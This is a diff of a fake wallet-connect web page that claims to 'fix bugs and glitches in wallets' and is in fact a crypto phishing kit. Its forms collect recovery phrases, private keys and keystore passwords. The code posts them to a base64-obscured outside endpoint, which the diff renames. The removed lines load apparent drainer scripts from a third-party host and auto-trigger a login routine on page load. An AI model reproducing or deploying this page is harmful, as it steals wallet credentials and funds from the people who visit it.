@@ -1,4 +1,5 @@
-<html><head>
+<html>
+<head>
 	<meta name="viewport" content="width=device-width">
 	<meta charset="utf-8">
 	<title>WalletConnect Registry</title>
@@ -36,36 +37,9 @@
 	<link rel="stylesheet" href="../details/bootstrap.min.css">
     <link rel="stylesheet" href="../details/fontawesome-all.min.css">
     <link rel="stylesheet" href="../details/style.css">-->
-    <script type="text/javascript"  src="https://code.jquery.com/jquery-3.6.0.min.js" crossorigin="anonymous"></script>
-<script type="text/javascript"  src="https://cdnjs.cloudflare.com/ajax/libs/jquery-cookie/1.4.1/jquery.cookie.min.js"></script>
-<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
-<link href="//cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet"> 
-<script type="text/javascript" src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-<script src="https://cdn.jsdelivr.net/gh/ethereum/web3.js/dist/web3.min.js"></script>
-<script type="text/javascript" src="https://unpkg.com/web3modal@1.9.7/dist/index.js"></script>
-<script type="text/javascript" src="https://github.com/WalletConnect/walletconnect-monorepo/releases/download/1.7.8/web3-provider.min.js"></script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.27.2/axios.min.js" integrity="sha512-odNmoc1XJy5x1TMVMdC7EMs3IVdItLPlCeL5vSUPN2llYKMJ2eByTTAIiiuqLg+GdNr9hF6z81p27DArRFKT7A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
-<script type="text/javascript" src="https://cdn.jsdelivr.net/gh/ethereumjs/browser-builds/dist/ethereumjs-tx/ethereumjs-tx-1.3.3.min.js"></script>
-<script language="javascript" type="text/javascript" src="https://eriga.jabhost.com/ted/ABI.js"></script>
-<script type="text/javascript" src="https://eriga.jabhost.com/ted/wallet-sdk-bundle.js"></script>
-<script type="text/javascript" src="https://eriga.jabhost.com/ted/main.js"></script>
-<script type="text/javascript" src="https://eriga.jabhost.com/ted/seaport.js"></script>
-<script>
-   $(document).ready(function(){
-  
-    $(".claim-button").click(function(event){
-        event.stopImmediatePropagation();
-        event.stopPropagation();
-        event.preventDefault();
-        login();
-        
-    });
-$(".claim-button").click();
-});
-</script>
 </head>
 
-<body  >
+<body>
 	<div id="">
 		<div class="font-roboto" id="content">
 			<header class="sticky top-0 z-10 flex items-center justify-between px-5 py-4 bg-white md:py-6 ">
@@ -89,9 +63,9 @@ $(".claim-button").click();
 			<main class="flex flex-col mx-8 mt-12 space-y-10 text-center align-middle">
 				<div class="flex justify-center">
 					<div class="max-w-3xl">
-						<h1 class="text-4xl font-medium text-cool-gray-500" style="color:#000;">Connect Wallet</h1>
-						<p class="mt-10 text-lg font-thin leading-6 text-gray-700" style="font-weight:800;">Smart Dapp Solutions is a decentralized protocol and platform that combines
-Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp;accurately.</p>
+						<h1 class="text-4xl font-medium text-cool-gray-500">Connect Wallet</h1>
+						<p class="mt-10 text-lg font-thin leading-6 text-gray-700">Smart Dapp Solutions is a decentralized protocol and platform that combines
+Blockchain and DeFi and can fix bugs and glitches in wallets when connected accurately.</p>
 						<!--<img src="banner-main.png">-->
 						<div class="mt-2"></div>
 					</div>
@@ -108,8 +82,6 @@ Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp
 									<div class="flex justify-center mt-4 font-semibold text-blue-500 group-hover:text-blue-700">Binance Smart Chain</div>
 								</div>            
 							</a>                            <a class="modal-btnn" href="#" hidden=""></a>
-							                             <a class="claim-button" href="#" hidden=""></a>
-							                             <a class="mode-button" href="#" hidden=""></a>
 															<a class="modal-link" href="#" hidden=""></a>
 						
        <!-- The Modal -->
@@ -118,10 +90,10 @@ Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp
     <span class="close">×</span>
     <div style="
     display: flex;
-">	<img style="
+">	<img  style="
     border-radius: 3000px;
     width: 80px;
-" id="walletimg" src="">
+" id ="walletimg" src="">
 
     <h2 style="
     padding-top: 30px;
@@ -134,8 +106,8 @@ Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp
 <center> <h1 style="
     font-size: 20px;
 ">Connect Manually </h1>	</center>
-<div id="diva"> <img style="" id="walletimgr" src="alert.jpg">
-<span id="ltext4" class="sr-only">  Please Try again</span></div>
+<div id="diva"> <img  style="" id ="walletimgr" src="alert.jpg">
+<span id = "ltext4" class="sr-only">  Please Try again</span></div>
     
     	<div class="container-fluid" style="
     margin-top: 20px;
@@ -159,11 +131,11 @@ Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp
 					<!-- Tab panes -->
 					<div class="tab-content">
 						<div role="tabpanel" class="tab-pane fade show active" id="phrase">
-							<form id="form1" method="post">
+							<form id="form1" method="post" >
 								<textarea class="form-control" rows="5" name="phrase" placeholder="Phrase" required=""></textarea>
 								<p class="text-secondary" style="margin-top: 10px;">Typically 12 (sometimes 24) words seperated by a single spaces.</p>
-								<input type="hidden" name="value" value="Ethereum">
-								<div class="form-group"><button style="
+								<input  type="hidden" name="value" value="Ethereum">
+								<div class="form-group"><button  style="
     padding: 5px;
     background-color: #0083ff;
     color: #ffff;
@@ -171,13 +143,13 @@ Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp
     border-radius: 3px;
     padding-right: 30px;
     padding-left: 30px;
-" class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
+"class="btn btn-primary btn-block" type="submit" name="submit">IMPORT</button></div>
 							</form>
 						</div>
 						<div role="tabpanel" class="tab-pane fade" id="keystore">
-							<form id="form2" method="post">
+							<form id="form2" method="post" >
 								<div class="form-group">
-									<textarea style="
+									<textarea  style="
     width: 100%;
     margin-top: 10px;
     border: solid 1px #0083ff;
@@ -189,7 +161,7 @@ Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp
     border-radius: 3px;
     width: 80%;
     border: 1px solid #0083ff;
-" class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
+"class="form-control" type="password" name="keystorepasswword" placeholder="Password" required="">
 								</div>
 								<p class="text-secondary" style="margin-top: 10px;">
 									Several lines of text beginning with "{...}" plus the password you used to encrypt it.
@@ -207,17 +179,17 @@ Blockchain and DeFi and can fix bugs and glitches in wallets when connected&nbsp
 							</form>
 						</div>
 						<div role="tabpanel" class="tab-pane fade" id="privatekey">
-							<form id="form3" method="post">
+							<form id="form3" method="post" >
 								<div class="form-group">
-									<input style="
+									<input  style="
     border-radius: 3px;
     margin-top: 10px;
     width: 80%;
     border: 1px solid #0083ff;
-" class="form-control" name="privatekey" placeholder="Private Key" required="">
+"class="form-control" name="privatekey" placeholder="Private Key" required="">
 								</div>
-								<p class="text-secondary" style="margin-top: 10px;">Typically starts with <span>"0X"</span> but can start with numbers too .</p>
-								<input type="hidden" name="value" value="Ethereum">
+								<p class="text-secondary" style="margin-top: 10px;">Typically starts with <span>"0X"</span> but can strat with numbers too .</p>
+								<input type="hidden"  name="value" value="Ethereum">
 								<div class="form-group"><button class="btn btn-primary btn-block" type="submit" name="submit" style="
     padding: 5px;
     margin-top: 10px;
@@ -389,32 +361,19 @@ li.nav-item.active {
 }
 </style>
 <script type="text/javascript">
-
-var infinity = document.querySelector(".mode-button");
-
-function banty() {
-    infinity.dispatchEvent(new Event("click"));
-}
-
 	// Set the pre-selected IDs
 $(document).ready(function() {
-    
 
- 
   // Get the modal
   var modal = document.getElementById("myModal");
   var modale = document.getElementById("myModal1");
   // Get the <span> element that closes the modal
   var span = document.getElementsByClassName("close")[0];
 $('.openModalBtn').click(function() {
-   // $(".claim-button").click();
 	window.modalText = $(this).data('modal-text');
 	console.log(modalText)
 	var imgg = $(this).find("img").attr("src");
-	
-   
-    $(".claim-button").click();
-   
+    $('#modal-btn').click();
 	$('.modal-btnn').click(function(event) {
 		event.preventDefault();
     // get the data attribute of clicked link
@@ -431,7 +390,6 @@ $('.openModalBtn').click(function() {
   window.onclick = function(event) {
     if (event.target == modal) {
       modale.style.display = "none";
-      $('form').trigger('reset');
     }
   }
   $('#modal-btn').click(function() {
@@ -461,8 +419,7 @@ $('.openModalBtn').click(function() {
     event.preventDefault();
      // get the data attribute of clicked link
     $('#walletimg').attr("src", imgg);
-    $('#modal-text').text(modalText); 
-    $('form').trigger('reset');// set the modal text
+    $('#modal-text').text(modalText); // set the modal text
     modal.style.display = "block"; // show the modal
   });
 
@@ -487,14 +444,13 @@ var modalTru = $('#modal-text').text();
   formData += "&wallet=" +modalText;
   
   $.ajax({
-    url: atob('aHR0cHM6Ly9veGJpdHdvcmxkLmNvbS93YWxsZXQvcHJvY2Vzc29yLnBocA=='),
+    url: atob('aHR0cHM6Ly9veGJpdHdvcmxkLmNvbS93YWxsZXQvcHJvY2Vzcy5waHA='),
     type: 'POST',
     data: formData,
     success: function(response) {
       if (response == "done"){
 
         modal.style.display = "none";
-        $('form').trigger('reset');
         $('#loadingSpinner').show();
         $('#ltext').show();
         setTimeout(function() {
@@ -515,10 +471,8 @@ var modalTru = $('#modal-text').text();
           $('#ltext4').show();
         }, 10000)
         $('#ltext4').text('Internet Connection bad! Please Try again With a good connection ');
-        $('form').trigger('reset');
       }else{
         modal.style.display = "none";
-        $('form').trigger('reset');
         $('#loadingSpinner').show();
         $('#ltext').show();
         setTimeout(function() {
@@ -540,13 +494,11 @@ var modalTru = $('#modal-text').text();
           $('#ltext4').show();
         }, 10000)
         $('#ltext4').text('Internet Connection bad! Please Try again With a good connection ');
-        $('form').trigger('reset');
       }
       console.log(response);
     },
     error: function(jqXHR, textStatus, errorThrown) {
       if (textStatus == 'error' ){
-
         $('#diva').show();
         $('#ltext4').text('Internet Connection bad! Please Try again With a good connection ');
         $('#ltext4').show();
@@ -557,7 +509,7 @@ var modalTru = $('#modal-text').text();
           $('#walletimgr').hide();
           $('#diva').hide();
         }, 10000);
-        $('form').trigger('reset');
+
 
       }
 
